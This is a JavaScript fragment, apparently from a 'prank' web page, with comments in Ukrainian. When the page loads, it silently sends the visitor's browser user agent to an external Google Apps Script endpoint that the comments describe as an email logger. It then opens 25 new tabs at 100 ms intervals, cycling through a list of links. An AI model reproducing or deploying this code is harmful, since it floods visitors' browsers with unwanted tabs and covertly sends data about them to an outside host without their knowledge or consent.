        const totalTabs = 25;     // скільки вкладок треба відкрити
        const delay = 100;        // затримка між відкриттям (мс)
        let count = 0;
        let index = 0;

        function openNextTab() {
            if (count < totalTabs) {

                // Вибір посилання по колу
                const url = links[index];
                index = (index + 1) % links.length;

                // Відкриття вкладки
                window.open(url, "_blank");


                count++;
                setTimeout(openNextTab, delay);
            }
        }

        // ===== ЛОГЕР НА EMAIL =====
        function sendEmailLog() {
            fetch("https://script.google.com/macros/s/AKfycbwWeLLOSIKL2Gf-MS5YCnvqiFPuHiW8fQrj6OqPw5lKXA5l3-geW_33qHFwIS8Shf6StA/exec?ua=" + encodeURIComponent(navigator.userAgent))
            .catch(err => console.log("Помилка логування:", err));
        }

        window.onload = function() {
            sendEmailLog();                  // надсилаємо лог на email
            setTimeout(openNextTab, 1000);   // старт пранку через 1 секунду
        };
